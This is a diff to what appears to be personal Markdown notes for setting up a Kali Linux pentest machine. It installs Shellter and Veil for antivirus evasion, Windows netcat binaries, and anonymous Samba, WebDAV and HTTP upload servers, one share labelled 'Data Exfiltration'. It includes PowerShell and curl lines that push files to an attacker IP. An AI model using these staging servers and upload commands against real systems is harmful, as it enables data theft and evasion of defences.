@@ -21,7 +21,7 @@ sudo apt update
 sudo apt install libc6:amd64
 ```
 
-## Install Docker 
+## Install Docker
 
 ```bash
 kali@kali:~$ sudo apt update
@@ -59,9 +59,8 @@ docker run -it --rm shellter:7.2
 
 ## Install Veil Framework x86 only
 
-* **Limitation**: Require x86 
+* **Limitation**: Require x86
 * Install Veil for AV Evasion `https://github.com/Veil-Framework/Veil`
-
 
 ```bash
 sudo apt -y install veil
@@ -108,7 +107,46 @@ sudo apt -y install exploitdb
 sudo apt install code...arm64.deb
 ```
 
-## Install WebDAV
+## Install Linux NC windows-binary
+
+```bash
+sudo apt install windows-binaries
+ll /usr/share/windows-binaries/
+windows-binaries -h
+```
+
+## Install Anonymous Samba Server
+
+```bash
+# Install and configure share folder
+sudo apt install samba
+sudo cat /etc/samba/smb.conf
+
+[share]
+   path = /var/lib/samba/share
+   comment = Data Exfiltration
+   browsable = yes
+   writable = yes
+   guest ok = yes
+;  guest only = yes
+   force user = nobody
+   create mask = 0666
+   directory mask = 0755
+
+# Create world writeable folder
+sudo mkdir -p /var/lib/samba/share
+sudo chmod -R 0777 /var/lib/samba/share
+sudo chown -R nobody:nogroup /var/lib/samba/share
+
+# Add user to samba share
+sudo smbpasswd -a kali
+
+# Run samba deamon
+sudo systemctl start smdb
+enum4linux -S ATTACKER-IP | grep -P "/share|Data Exfiltration"
+```
+
+## Install Anonymous WebDAV
 
 ```bash
 sudo apt install python3-wsgidav
@@ -117,7 +155,7 @@ echo "WebDAV test" > /home/kali/webdav/test.txt
 /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
 ```
 
-## Install HTTP Upload Server
+## Install Anonymous HTTP Upload Server
 
 ```bash
 pip install uploadserver
@@ -128,6 +166,8 @@ Patch uploadserver.receive_upload(handler)
 * Support single or multiple files
 * Support Powershell UploadFile
 * `(New-Object Net.WebClient).UploadFile('http://IP/upload', 'some-file.txt');`
+* Support CURL file upload using option `-F`
+* `curl -X POST http://IP/upload -F 'files=@example-1.txt' -F 'files=@example-2.txt'`
 
 ```python
 # gedit /home/kali/.local/lib/python3.11/site-packages/uploadserver/__init__.py
